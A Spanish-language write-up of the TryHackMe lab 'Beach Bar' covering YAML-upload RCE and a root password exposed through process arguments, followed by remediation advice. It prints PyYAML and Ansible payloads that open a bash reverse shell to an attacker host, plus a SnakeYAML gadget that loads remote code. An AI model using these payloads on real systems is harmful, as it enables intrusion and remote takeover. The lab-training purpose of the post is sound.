---
layout: post
title: "Beach Bar - TryHackMe - Linux"
date: 2026-08-02
img: assets/img/beachbar/banner.png
tags: [Linux, TryHackMe, yml, ps aux, ]
---

Beach Bar es una máquina Linux que simula una aplicación web de gestión de música (jukebox) expuesta a usuarios de la red local. La máquina demuestra el impacto de dos fallos críticos de configuración y desarrollo: la desinfección inadecuada al procesar archivos de entrada y la exposición de credenciales sensibles a través de los argumentos en la línea de comandos de servicios en segundo plano.

[Link a Beach Bar - TryHackMe](https://tryhackme.com/room/hh-beachbar-d849f7f7)

![](/secnotes/assets/img/beachbar/Pasted%20image%2020260802124701.png)

![](/secnotes/assets/img/beachbar/Pasted%20image%2020260802124712.png)

![](/secnotes/assets/img/beachbar/Pasted%20image%2020260802125135.png)![](Pasted%20image%2020260802125429.png)


En el código de la página de login encontramos un comentario que nos dice que sigue habilitada el demo con las credenciales dj / dj 

 Ganamos el acceso con estas credenciales.
 
![](/secnotes/assets/img/beachbar/Pasted%20image%2020260802125611.png)

Aquí tenemos la opción de descargar y subir archivos .yml, este es un vector clásico y común en CTF para realizar ataques de RCE (Ejecución Remota de Comandos). La razón técnica es que muchos analizadores y frameworks permiten la deserialización de objetos, lo que ejecuta código automáticamente cuando el servidor lee los archivos subidos.  

**Identificación de la técnología que procesa el YAML**

* **A) Python (PyYAML)**

PyYAML permite istanciar objetos python mediante la etiqueta `!!python/object/apply`

```
!!python/object/apply:subprocess.Popen
- - /bin/bash
  - -c
  - bash -i >& /dev/tcp/IP ATACANTE/443 0>&1
```

* **B) Si el archivo se procesa vía Ansible / Task Runner / CI

A veces el servidor  ejecuta internamente una tarea cuando subimos un `.yml` 

```
- hosts: localhost
  tasks:
    - name: Reverse Shell
      command: bash -c "bash -i >& /dev/tcp/IP ATACANTe/443 0>&1"
```

* **C) Si el backend es Java (SnakeYAML)**

Si la aplicación corre sobre java, se suele abusar de clases como ` javax.script.ScriptEngineManager`

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.X.X/"]
  ]]
]
```

Pondremos nuestro listener en escucha por el puerto 443 e iremos probando subir los archivos `.yml`

![](/secnotes/assets/img/beachbar/Pasted%20image%2020260802131133.png)

![](/secnotes/assets/img/beachbar/Pasted%20image%2020260802131151.png)

obtenemos la flag de usuario

![](/secnotes/assets/img/beachbar/Pasted%20image%2020260802131336.png)


Luego de inspeccionar los permisos de aplicaciones con el SUID, tareas cron,  no obtuvimos información de utilidad.

Al ingresar al directorio _Jukebox_, nos encontramos un script de python llamado **jukebox.py**

![](/secnotes/assets/img/beachbar/Pasted%20image%2020260802135121.png)

```
#!/usr/bin/env python3

import argparse
import time

NOW_PLAYING = [
    "Khruangbin - Maria Tambien",
    "Men I Trust - Show Me How",
    "Crumb - Locket",
    "Mac DeMarco - Chamber of Reflection",
]


def main():
    parser = argparse.ArgumentParser(description="Beach Bar jukebox streamer")
    parser.add_argument("--stream-pass", required=True, help="stream backend password")
    parser.add_argument("--bitrate", default="320k")
    args = parser.parse_args()

    i = 0
    while True:
        track = NOW_PLAYING[i % len(NOW_PLAYING)]
        i += 1
        time.sleep(30)


if __name__ == "__main__":
    main()
```
Vemos que el script estaba diseñado para recibir obligadamente un argumento llamado `--stream-pass`

`parser.add_argument("--stream-pass", required=True, help="stream backend password")`

Esto nos advertía que para que el script pudiera arrancar, el sistema tenía que pasarle una contraseña a la fuerza a través de la línea de comandos.

Con esta información, filtramos los procesos con `ps aux` y aplicamos un filtrado con `grep`

![](/secnotes/assets/img/beachbar/Pasted%20image%2020260802135553.png)

![](/secnotes/assets/img/beachbar/Pasted%20image%2020260802135702.png)

descubrimos que el script se estaba ejecutando y vemos que alguien programó el servicio para que ejecutara ese script en segundo plano como `root`, y para evitar tener que ingresar la contraseña manualmente cada vez, la escribieron directamente en plano dentro el comando de inicio.

`root 610 ... python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k`

### En resumen ###

El script definía qué parámetros necesitaba el programa para funcionar.
El proceso del sistema operativo reveló el valor real de esos parámetros por que el script se ejecutaba de manera insegura exponiendo sus argumentos a cualquier usuario local.

## Como corregir esto en un entorno real? ##

1. **Gestión de secretos:** Nunca pasar contraseñas por argumentos de CLI. Deben cargarse desde variables de entorno o archivos de configuración con permisos restringidos (`chmod 600`).
2. **Restricciones de** `/proc`: Montar `/proc` con la opción `hidepid=2` en el servidor para evitar que usuarios sin privilegios vean procesos de otros usuarios.
3. **Principio de Menor Privilegio:** Un servicio de reproducción de música (`jukeboxd`) jamás debería ejecutarse con privilegios `root`
4. **Políticas de Contraseñas:** No reutilizar contraseñas de servicios en la cuenta de administración principal del sistema.
